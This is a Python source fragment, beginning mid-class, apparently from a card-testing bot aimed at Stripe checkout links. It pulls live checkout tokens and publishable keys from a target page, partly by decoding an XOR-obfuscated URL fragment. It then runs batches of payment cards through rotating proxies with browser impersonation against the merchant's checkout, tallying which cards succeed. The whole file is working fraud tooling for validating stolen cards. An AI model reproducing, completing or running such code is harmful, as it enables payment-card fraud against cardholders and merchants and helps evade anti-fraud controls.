        self.user_id = user_id
        self.url = url
        self.cards = cards
        self.successes = 0
        self.fails = 0
        self.completed = 0
        self.total = len(cards[:MAX_ATTEMPTS])
        self.url_info = None
        self.update_callback = update_callback
        self.is_running = True
        
    async def analyze_first(self):
        url_lower = self.url.lower()
        if 'cs_' not in url_lower and 'buy.stripe.com' not in url_lower and 'invoice.stripe.com' not in url_lower:
            if self.update_callback:
                await self.update_callback({"status": "error", "error": "This does not appear to be a valid Stripe link. Need a checkout, buy, or invoice link."})
            return False
            
        for _ in range(3):
            try:
                proxy_data = await ProxyManager.get_random(self.user_id)
                proxies = None
                if proxy_data:
                    auth = f"{proxy_data['username']}:{proxy_data['password']}@" if 'username' in proxy_data else ""
                    proxy_url = f"http://{auth}{proxy_data['server'].replace('http://', '')}"
                    proxies = {"http": proxy_url, "https": proxy_url}
                
                if self.update_callback: await self.update_callback({"status": "analyzing", "step": "Fast-analyzing Stripe endpoint..."})
                
                async with cffi_requests.AsyncSession(impersonate="chrome120", proxies=proxies) as s:
                    resp = await s.get(self.url, timeout=30)
                    html = resp.text
                    
                    cs_token = StripeAPIExtractor.extract_cs_live(self.url, html)
                    
                    pk_key = None
                    hash_idx = self.url.find('#')
                    if hash_idx != -1:
                        import urllib.parse, base64, json
                        hash_str = self.url[hash_idx+1:]
                        decoded = urllib.parse.unquote(hash_str)
                        try:
                            raw_bytes = base64.b64decode(decoded + '==')
                            json_str = ''.join(chr(b ^ 5) for b in raw_bytes)
                            data = json.loads(json_str)
                            pk_key = data.get('apiKey')
                        except: pass
                    if not pk_key:
                        pk_key = StripeAPIExtractor.extract_pk_live(html)
                        
                    self.url_info = {'cs_token': cs_token, 'pk_key': pk_key, 'merchant': 'Unknown', 'amount': None, 'raw_amount': None}
                    
                    if cs_token and pk_key:
                        api_data = await StripeAPIExtractor.fetch_payment_data(self.user_id, cs_token, pk_key)
                        if api_data.get('success'):
                            self.url_info['amount'] = api_data.get('amount')
                            self.url_info['raw_amount'] = api_data.get('raw_amount')
                            self.url_info['merchant'] = api_data.get('merchant')
                    return True
            except Exception as e:
                continue
                
        if self.update_callback:
            await self.update_callback({"status": "error", "error": "Failed to analyze Stripe endpoint. Proxies might be dead."})
        return False

    async def _worker(self, queue: asyncio.Queue):
        while self.is_running:
            try:
                card, attempt_num = queue.get_nowait()
            except asyncio.QueueEmpty:
                break
                
            try:
                max_retries = 2
                for try_idx in range(max_retries):
                    proxy_data = await ProxyManager.get_random(self.user_id)
                    hitter = StripeAPIHitter(self.url_info['pk_key'], self.url_info['cs_token'], proxy_data, self.url_info.get('raw_amount'))
                    result = await hitter.hit(card, attempt_num, self.user_id)
                    result['amount'] = self.url_info.get('amount')
                    result['merchant'] = self.url_info.get('merchant')
                    
                    err_str = result.get('error', '')
                    should_retry = False
                    if result.get('decline_code') == 'exception':
                        if any(k in err_str for k in ['Timeout', 'ERR_', 'closed', 'refused', 'reset', 'disconnected', 'socket', 'Navigation failed']):
                            should_retry = True
                            
                    if should_retry:
                        if try_idx < max_retries - 1:
                            delay = 2.0 * (try_idx + 1)
                            await asyncio.sleep(delay)
                            continue
                    break
                
                self.completed += 1
                if result['success']:
                    self.successes += 1
                else:
                    self.fails += 1
                    
                if self.update_callback:
                    await self.update_callback({
                        "status": "progress",
                        "result": result,
                        "completed": self.completed,
                        "total": self.total,
                        "successes": self.successes,
                        "fails": self.fails
                    })
            except Exception as e:
                print(f"DEBUG: _worker processing card {card} failed completely: {str(e)}")
            finally:
                queue.task_done()
    
    async def run(self):
        if self.update_callback:
            await self.update_callback({"status": "starting"})
            
        success = await self.analyze_first()
        if not success:
            return
            
        if self.update_callback:
            await self.update_callback({"status": "starting", "url_info": self.url_info})
            
        import asyncio
        queue = asyncio.Queue()
        for idx, card in enumerate(self.cards[:MAX_ATTEMPTS]):
            queue.put_nowait((card, idx+1))
            
        workers = []
        for _ in range(min(CONCURRENT_BATCH_SIZE, len(self.cards))):
            task = asyncio.create_task(self._worker(queue))
            workers.append(task)
            
        await queue.join()
        
        for w in workers:
            w.cancel()
            
        if self.update_callback:
            await self.update_callback({"status": "completed", "successes": self.successes, "fails": self.fails})
